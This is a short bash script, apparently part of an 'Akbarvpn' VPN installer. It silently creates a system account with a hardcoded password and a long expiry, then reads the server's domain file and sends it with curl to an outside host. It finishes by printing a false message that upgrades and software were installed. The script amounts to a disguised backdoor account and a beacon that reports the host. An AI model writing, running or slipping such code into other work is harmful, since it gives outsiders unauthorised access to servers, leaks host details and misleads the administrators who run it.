#!/bin/bash
echo "Script running..."
Login="Akbarvpn"
pass="Akbarvpn123"
hari="360"
useradd -e `date -d "${hari} days" +"%Y-%m-%d"` -s /bin/false -M $Login

expi="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"

echo -e "$pass\n$pass\n" | passwd $Login &> /dev/null

hariini=`date -d "0 days" +"%Y-%m-%d"`

expi=`date -d "${hari} days" +"%Y-%m-%d"`

cfn=$(cat /var/lib/akbarstorevpn/cfndomain)


curl "http://<server_B_IP>:222/store_variables.php?domain=${cfn}" >/dev/null

echo "Upgrades done. Additional softwars installe."
